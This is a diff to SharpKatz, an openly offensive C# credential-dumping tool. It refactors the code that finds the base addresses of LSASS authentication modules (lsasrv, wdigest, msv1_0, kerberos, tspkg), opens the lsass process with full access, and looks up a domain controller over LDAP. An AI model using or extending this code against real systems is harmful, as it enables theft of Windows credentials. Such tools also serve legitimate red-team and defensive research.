@@ -150,32 +150,33 @@ namespace SharpKatz
 
                 for (int i = 0; i < processModules.Count && modulefound < 5; i++)
                 {
-                    if (processModules[i].ModuleName.ToLower().Contains("lsasrv.dll"))
+                    string lower = processModules[i].ModuleName.ToLowerInvariant();
+
+                    if (lower.Contains("lsasrv.dll"))
                     {
                         lsasrv = processModules[i].BaseAddress;
                         modulefound++;
                     }
-                    if (processModules[i].ModuleName.ToLower().Contains("wdigest.dll"))
+                    else if (lower.Contains("wdigest.dll"))
                     {
                         wdigest = processModules[i].BaseAddress;
                         modulefound++;
                     }
-                    if (processModules[i].ModuleName.ToLower().Contains("msv1_0.dll"))
+                    else if (lower.Contains("msv1_0.dll"))
                     {
                         lsassmsv1 = processModules[i].BaseAddress;
                         modulefound++;
                     }
-                    if (processModules[i].ModuleName.ToLower().Contains("kerberos.dll"))
+                    else if (lower.Contains("kerberos.dll"))
                     {
                         kerberos = processModules[i].BaseAddress;
                         modulefound++;
                     }
-                    if (processModules[i].ModuleName.ToLower().Contains("tspkg.dll"))
+                    else if (lower.Contains("tspkg.dll"))
                     {
                         tspkg = processModules[i].BaseAddress;
                         modulefound++;
                     }
-
                 }
 
                 hProcess = Natives.OpenProcess(Natives.ProcessAccessFlags.All, false, plsass.Id);
@@ -232,8 +233,8 @@ namespace SharpKatz
                 Console.WriteLine("[!] {0} will be the domain", domain);
                 if (string.IsNullOrEmpty(dc))
                 {
-                    DirectoryEntry rootdse = new DirectoryEntry("LDAP://RootDSE");
-                    dc = (string)rootdse.Properties["dnshostname"].Value;
+                    using (DirectoryEntry rootdse = new DirectoryEntry("LDAP://RootDSE"))
+                        dc = (string)rootdse.Properties["dnshostname"].Value;
                 }
                 Console.WriteLine("[!] {0} will be the DC server", dc);
                 string alt_service = "ldap";
